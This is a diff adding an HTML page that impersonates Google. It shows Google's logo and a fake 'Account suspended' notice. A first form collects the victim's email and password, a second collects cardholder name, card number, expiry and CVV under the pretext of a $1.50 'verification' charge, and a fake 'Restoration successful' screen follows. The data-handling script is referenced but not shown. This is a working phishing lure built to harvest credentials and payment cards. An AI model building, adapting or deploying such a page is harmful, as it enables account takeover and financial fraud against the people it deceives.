@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Suspended</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- Icono de pestaña (opcional) -->
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+</head>
+<body>
+
+    <div class="container">
+        <!-- Logo Google -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google" class="logo">
+        
+        <h1>Account suspended</h1>
+        <p>We found a suspicious sign-in and suspended your account to keep it safe.</p>
+        <p>Please confirm it's you by verifying your identity.</p>
+
+        <!-- PASO 1: Credenciales -->
+        <form id="step1" class="form-step active">
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Email or phone" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn primary">Continue</button>
+            <div class="footer-links">
+                <a href="#">More options</a>
+            </div>
+        </form>
+
+        <!-- PASO 2: Tarjeta (Oculto al inicio) -->
+        <form id="step2" class="form-step">
+            <h3>Verify with a credit card</h3>
+            <p class="small-text">We will charge $1.50 USD to verify your identity. This is a temporary hold and will be removed.</p>
+            
+            <div class="input-group">
+                <input type="text" placeholder="Cardholder Name" required>
+            </div>
+            <div class="input-group">
+                <input type="text" placeholder="Card Number" maxlength="19" required>
+            </div>
+            <div class="row">
+                <div class="input-group half">
+                    <input type="text" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="input-group half">
+                    <input type="text" placeholder="CVV" maxlength="3" required>
+                </div>
+            </div>
+            
+            <button type="submit" class="btn primary">Pay $1.50 & Restore</button>
+        </form>
+
+        <!-- PASO 3: Loading (Oculto al inicio) -->
+        <div id="loader" class="form-step">
+            <div class="spinner"></div>
+            <p>Verifying your account...</p>
+        </div>
+
+        <!-- PASO 4: Éxito (Oculto al inicio) -->
+        <div id="success" class="form-step">
+            <h2 style="color: green;">Restoration successful</h2>
+            <p>Your account is being restored now.</p>
+        </div>
+
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
